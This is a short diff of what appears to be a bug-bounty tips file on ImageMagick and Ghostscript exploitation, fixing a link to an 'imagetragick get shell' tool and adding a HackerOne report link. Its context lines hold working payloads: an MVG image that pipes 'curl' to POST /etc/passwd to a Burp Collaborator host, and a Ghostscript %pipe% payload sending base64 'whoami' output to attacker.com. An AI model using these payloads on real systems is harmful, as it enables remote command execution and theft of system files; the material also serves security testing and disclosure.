@@ -18,7 +18,7 @@
     push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://xxx.burpcollaborator.net/test1")' pop graphic-context
     
 
-   (https://github.com/vishwaraj101/imagetragick)[This Tool imgetragick get shell]
+   [This Tool imgetragick get shell](https://github.com/vishwaraj101/imagetragick)
     
 ## TIP-4 
 
@@ -31,3 +31,11 @@
     currentdevice null true mark /OutputICCProfile (%pipe%curl http://attacker.com/?a=$(whoami|base64) )
     .putdeviceparams
     quit
+    
+   [Hackerone report](https://hackerone.com/reports/403417)
+   
+   
+   
+   
+   
+   
